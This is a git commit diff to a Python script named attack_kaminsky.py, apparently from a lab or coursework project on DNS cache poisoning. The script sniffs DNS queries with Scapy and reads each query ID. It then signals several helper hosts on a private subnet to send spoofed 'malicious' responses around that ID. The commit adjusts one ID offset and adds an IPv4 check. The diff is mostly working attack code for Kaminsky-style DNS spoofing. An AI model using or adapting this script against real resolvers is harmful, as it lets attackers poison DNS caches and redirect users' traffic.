594fd4ea74affd978a323d02f2d502ed8fb970ca
lucarighes <luca.righes@gmail.com>
2021-04-21 10:48:41 +0200

    try with qid-2

--- shared/attack_kaminsky.py
+++ shared/attack_kaminsky.py
@@ -18,11 +18,12 @@ if __name__ == "__main__":
 	print("Waiting for new DNS requests...")
 	while 1:
 		sniffed_packet=sniff(iface="eth0", filter="src host " + src_ip + " and dst host " + dst_ip + " and dst port 53", count=1)
-		if sniffed_packet[0].haslayer(DNS):
+		if sniffed_packet[0].haslayer(DNS) and sniffed_packet[0].version == 4:
 			dns=sniffed_packet[0].getlayer(DNS)
 			qid=dns.id
 			print("DNS request intercepted with QID of: " + str(qid) + ". Starting sending malicius response.")
 			
-			threading.Thread(target=requests.get, args=('http://192.168.0.160:8889?start_qid=' + str(qid),)).start()
+			threading.Thread(target=requests.get, args=('http://192.168.0.160:8889?start_qid=' + str(qid-2),)).start()
 			threading.Thread(target=requests.get, args=('http://192.168.0.161:8889?start_qid=' + str(qid-1000),)).start()
 			threading.Thread(target=requests.get, args=('http://192.168.0.162:8889?start_qid=' + str(qid+1000),)).start()
+		
